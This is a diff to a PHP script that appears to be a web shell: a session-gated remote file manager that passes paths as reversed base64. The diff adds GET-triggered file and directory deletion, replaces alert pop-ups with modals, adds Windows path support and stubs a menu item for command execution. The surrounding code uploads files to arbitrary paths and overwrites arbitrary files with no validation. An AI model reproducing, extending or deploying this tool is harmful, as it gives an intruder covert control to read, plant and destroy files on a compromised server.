@@ -63,7 +63,6 @@ if(empty($_SESSION['xboi'])){
 </head>
 <body>
 
-
 <nav class="navbar navbar-default">
     <div class="container-fluid">
         <div class="navbar-header">
@@ -83,10 +82,11 @@ if(empty($_SESSION['xboi'])){
 
 <div class="container">
     <div class="dropdown">
-        <button class="btn btn-success dropdown-toggle" type="button" data-toggle="dropdown">Actions
+        <button class="btn btn-success dropdown-toggle" type="button" data-toggle="dropdown">Features
             <span class="caret"></span></button>
         <ul class="dropdown-menu">
             <li><a data-toggle="modal" href="#uploadModal">Upload Files</a></li>
+            <li><a data-toggle="modal" href="#commandExecuteModal">Yet to Come</a></li>
         </ul>
     </div>
 </div>
@@ -136,39 +136,21 @@ if(empty($_SESSION['xboi'])){
     </div>
 </div>
 
-
-
-
 <?php
-
-
 
 // global variables
 $GLOBALS['path'] = bdecode($_GET["path"]);
-
-
 $file_upload_check = $_FILES["myfile"];
 
+// calling delete functions
+$del_file = $_GET["del_file"];
+$del_dir  = $_GET["del_dir"];
 
-if($file_upload_check != NULL){
-    $upload_path = $_POST["upload_path"];
-    $filename = $_POST["filename"];
-
-    // calling upload function
-    upload_files($upload_path, $filename);
-
+if(isset($del_dir)){
+    delete_dir(bdecode($del_dir));
 }
-
-function upload_files($upload_path, $filename){
-
-    $main_path = $upload_path.$filename;
-    if(copy($_FILES["myfile"]["tmp_name"], $main_path)){
-
-        echo "<script>alert(\"File Uploaded to: . $main_path. \")</script>";
-
-    }
-
-    header("refresh: 0.1");
+if(isset($del_file)){
+    delete_files(bdecode($del_file));
 }
 
 
@@ -182,6 +164,56 @@ function bdecode($data){
     $result = base64_decode($rev);
     return $result;
 }
+
+function modalForAll($alert_msg){
+    ?>
+
+    <div class="modal fade" id="modalForAll" role="dialog">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <h4 class="modal-title"><span class="glyphicon glyphicon-eye-open"></span></h4>
+                </div>
+                <div class="modal-body">
+                    <p><?php echo $alert_msg; ?></p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php
+    echo "<script>$('#modalForAll').modal('show')</script>";
+}
+
+if($file_upload_check != NULL){
+    $upload_path = $_POST["upload_path"];
+    $filename = $_POST["filename"];
+
+    // calling upload function
+    upload_files($upload_path, $filename);
+
+}
+
+
+
+function upload_files($upload_path, $filename){
+
+    $main_path = $upload_path.$filename;
+    if(copy($_FILES["myfile"]["tmp_name"], $main_path)){
+
+        $alert = "File Uploaded!";
+        modalForAll($alert);
+        //echo "<script>delete window.alert;</script>";
+        //echo "<script>alert(\"File Uploaded to: . $main_path. \")</script>";
+
+    }
+
+   // header("refresh: 0.1");
+}
+
 
 function check_filepermission($filepath){
 
@@ -244,10 +276,9 @@ function openFiles($filepath){
 
     if(is_readable($filepath) ){
 
-        $get_contents = htmlspecialchars(file_get_contents($filepath));
+        $get_contents = htmlspecialchars(file_get_contents( $filepath));
 
         ?>
-
 
         <!-- Open files modal -->
         <div class="modal fade" id="openFilesModal">
@@ -294,18 +325,48 @@ function openFiles($filepath){
             $fp = fopen($filepath, "w+");
             if(fwrite($fp, $_POST["text_content"])){
                 header("refresh: 0.1");
-                echo "<script>alert('File Written')</script>";
+                $alert = "File Written!";
+                modalForAll($alert);
+                //echo "<script>alert('File Written')</script>";
 
             }else{
-                echo "<script>alert(\"File not written.\");</script>";
+                $alert = "File NOT Written!";
+                modalForAll($alert);
             }
 
             fclose($fp);
         }
     }else{
-        die("<script>alert(\"File don't have read permissions.\");</script>");
+        //die("<script>alert(\"File don't have read permissions.\");</script>");
+        $alert = "File don't have read permissions.!";
+        modalForAll($alert);
     }
 
+}
+
+
+function delete_dir($dirname){
+
+    if(is_dir($dirname)){
+        if(rmdir($dirname)) {
+            $alert = "Removed DIR: $dirname";
+            modalForAll($alert);
+        }else{
+            $alert = "Error Removing DIR: $dirname";
+            modalForAll($alert);
+        }
+    }
+
+}
+
+function delete_files($filename){
+    if (!unlink($filename)) {
+        $alert = "Error Deleting: $filename";
+        modalForAll($alert);
+    } else {
+        $alert = "Deleted: $filename";
+        modalForAll($alert);
+    }
 }
 
 function listallFiles($path){
@@ -317,8 +378,8 @@ function listallFiles($path){
 
     $current_path_after_change = getcwd();
 
-    $files_and_dir =     glob("*");
-    $fd_count      =     count($files_and_dir);
+    $files_and_dir   =     glob("*");
+    //$fd_count      =     count($files_and_dir);
 
 
 
@@ -334,6 +395,7 @@ function listallFiles($path){
                 <th>Files</th>
                 <th>File Type</th>
                 <th>Permission</th>
+                <th>action</th>
             </tr>
             </thead>
 
@@ -350,9 +412,25 @@ function listallFiles($path){
                     <!-- this tbody could be used for the files listing too -->
                     <tbody>
                     <tr>
-                        <td><?php echo "<a href='?path=".bencode($current_path_after_change."/".$files."/")."'>$files<a/><br>"; ?></td>
+                        <td><?php
+                            if(check_os() == "Win"){
+                                echo "<a href='?path=".bencode($current_path_after_change."\\".$files."\\")."'>$files<a/><br>";
+                            }else{
+                                echo "<a href='?path=".bencode($current_path_after_change."/".$files."/")."'>$files<a/><br>";
+                            }
+                            ?></td>
                         <td>DIR</td>
                         <td><?php check_filepermission($files); ?></td>
+                        <td>
+                            <?php
+                            if(check_os() == "Win"){
+                                //echo $current_path_after_change."\\".$files;
+                                echo "<a href='?path=".bencode($current_path_after_change."\\")."&del_dir=".bencode($files)."'>R<a/><br>";
+                            }else{
+                                echo "<a href='?path=".bencode($current_path_after_change."/")."&del_dir=".bencode($files)."'>R</a>";
+                            }
+                            ?>
+                        </td>
                     </tr>
                     </tbody>
 
@@ -362,13 +440,30 @@ function listallFiles($path){
                 }else{
 
                     $filename = $_GET["filename"];
+
                     ?>
                     <tbody>
                     <tr>
 
-                        <td><?php echo "<a href='?path=".bencode($current_path_after_change."/".$files)."&filename=".bencode($files)."'>$files<a/><br>";?></td>
+                        <td><?php
+                            if(check_os() == "Win"){
+                                echo "<a href='?path=".bencode($current_path_after_change."\\".$files)."&filename=".bencode($current_path_after_change."\\".$files)."'>$files<a/><br>";
+
+                            }else{
+
+                                echo "<a href='?path=".bencode($current_path_after_change."/".$files)."&filename=".bencode($current_path_after_change."/".$files)."'>$files<a/><br>";
+                            }
+
+                            ?></td>
                         <td>FILE</td>
                         <td><?php check_filepermission($files); ?></td>
+                        <td><?php
+                            if(check_os() == "Win"){
+                                echo "<a href='?path=".bencode($current_path_after_change."\\")."&del_file=".bencode($files)."'>R</a>";
+                            }else{
+                                echo "<a href='?path=".bencode($current_path_after_change."/")."&del_file=".bencode($files)."'>R</a>";
+                            }
+                            ?></td>
                     </tr>
                     </tbody>
 
@@ -387,19 +482,22 @@ function listallFiles($path){
 
     if(isset($filename)){
         // this section helps opening files
-
         echo "<script type='text/javascript'>
         $(document).ready(function(){
         $('#openFilesModal').modal('show');     
        
         });
         </script>";
-        openFiles(bdecode($filename));
+        if(check_os() == "Win"){
+            openFiles(bdecode($filename));
+        }else{
+            openFiles(bdecode($filename));
+        }
 
     }
 
-}
 
+}
 
 function changePath($path){
 
@@ -447,7 +545,6 @@ function changePath($path){
         for ($i = 0; $i < $total_arr_elements; $i++) {
 
             // appends directory after directory from an array var $explode_path to a string var $emp_string
-
             if (check_os() == "Win") {
                 $emp_string .= $explode_path[$i] . "\\";
                 echo "<a href='?path=" . bencode($emp_string) . "'>$explode_path[$i]\</a>";
@@ -460,7 +557,6 @@ function changePath($path){
         }
 
         echo "</center>";
-
 
         // requests the path thru GET parameter
         if (isset($path) && !empty($path)) {
